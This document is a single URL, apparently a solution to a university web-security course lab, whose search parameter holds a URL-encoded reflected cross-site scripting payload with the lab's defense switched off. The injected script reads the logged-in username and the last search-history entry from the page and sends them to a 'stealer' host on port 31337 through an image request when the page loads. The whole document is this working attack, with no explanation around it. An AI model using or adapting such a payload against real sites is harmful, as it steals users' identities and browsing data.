http://cpsc4200.mpese.com/search?xssdefense=0&q=%3Cscript%3E%0A%28function%28%29%7B%0A%20%20//%20trims%20and%20removes%20trailing%20punctuation%0A%20%20const%20strip%20%3D%20s%20%3D%3E%20%28s%20%7C%7C%20%27%27%29.trim%28%29.replace%28/%5B.%2C%3B%3A%21%3F%5D%2B%24/%2C%20%27%27%29%3B%0A%0A%20%20//%20returns%20true%20for%20non-empty%20non-tag%20search%20strings%0A%20%20const%20isValidSearchTerm%20%3D%20s%20%3D%3E%0A%20%20%20%20typeof%20s%20%3D%3D%3D%20%27string%27%20%26%26%0A%20%20%20%20s.trim%28%29.length%20%3E%200%20%26%26%0A%20%20%20%20//%20make%20sure%20it%20doesn%27t%20contain%20angle%20brackets%20or%20percent%20signs%20%28tags/encodings%29%0A%20%20%20%20%21/%5B%3C%25%5D/.test%28s%29%20%26%26%0A%20%20%20%20/%5BA-Za-z0-9%5D/.test%28s%29%3B%0A%0A%20%20//%20finds%20the%20username%20from%20the%20page%0A%20%20function%20getUsername%28%29%7B%0A%20%20%20%20const%20bodyText%20%3D%20document.body%20%26%26%20document.body.innerText%20%7C%7C%20%27%27%3B%0A%20%20%20%20const%20m%20%3D%20bodyText.match%28/Logged%20in%20as%5Cs%2B%28%5B%5E%5Cn%5D%2B%29/i%29%3B%0A%20%20%20%20return%20m%20%3F%20strip%28m%5B1%5D%29%20%3A%20%27%27%3B%0A%20%20%7D%0A%0A%20%20//%20finds%20the%20last%20legitimate%20search%20query%20from%20the%20history%20list%0A%20%20function%20getLastSearchFromHistory%28%29%7B%0A%20%20%20%20const%20historyContainer%20%3D%20document.getElementById%28%27history-list%27%29%3B%0A%20%20%20%20if%20%28%21historyContainer%29%20return%20%27%27%3B%0A%20%20%20%20const%20historyLinks%20%3D%20historyContainer.querySelectorAll%28%27a.history-item%2C%20a.list-group-item%5Bhref%5E%3D%22search%3Fq%3D%22%5D%2C%20a%5Bhref%2A%3D%22search%3Fq%3D%22%5D%27%29%3B%0A%20%20%20%20for%20%28const%20link%20of%20historyLinks%29%7B%0A%20%20%20%20%20%20const%20linkText%20%3D%20%28link.textContent%20%7C%7C%20%27%27%29.trim%28%29%3B%0A%20%20%20%20%20%20if%20%28isValidSearchTerm%28linkText%29%29%20return%20linkText.split%28/%5Cr%3F%5Cn/%29%5B0%5D.trim%28%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20return%20%27%27%3B%0A%20%20%7D%0A%0A%20%20//%20sends%20the%20extracted%20data%20to%20the%20stealer%27s%20server%0A%20%20function%20sendToStealer%28username%2C%20search%29%7B%0A%20%20%20%20const%20url%20%3D%20%27http%3A//stealer%3A31337/%3Fstolen_user%3D%27%20%2B%20encodeURIComponent%28username%7C%7C%27%27%29%20%2B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%27%26last_search%3D%27%20%2B%20encodeURIComponent%28search%7C%7C%27%27%29%3B%0A%20%20%20%20new%20Image%28%29.src%20%3D%20url%3B%0A%20%20%7D%0A%0A%20%20function%20run%28%29%7B%0A%20%20%20%20const%20extractedUsername%20%3D%20getUsername%28%29%3B%0A%20%20%20%20const%20extractedSearch%20%3D%20getLastSearchFromHistory%28%29%3B%0A%20%20%20%20console.log%28%27Sending%20to%20stealer%3A%27%2C%20%7BextractedUsername%2C%20extractedSearch%7D%29%3B%0A%20%20%20%20sendToStealer%28extractedUsername%2C%20extractedSearch%29%3B%0A%20%20%7D%0A%0A%20%20if%20%28document.readyState%20%3D%3D%3D%20%27loading%27%29%20%7B%0A%20%20%20%20//%20wait%20until%20the%20DOM%20is%20fully%20loaded%0A%20%20%20%20document.addEventListener%28%27DOMContentLoaded%27%2C%20%28%29%3D%3EsetTimeout%28run%2C100%29%2C%20%7Bonce%3Atrue%7D%29%3B%0A%20%20%7D%20else%20%7B%0A%20%20%20%20setTimeout%28run%2C100%29%3B%0A%20%20%7D%0A%7D%29%28%29%3B%0A%3C/script%3E%0A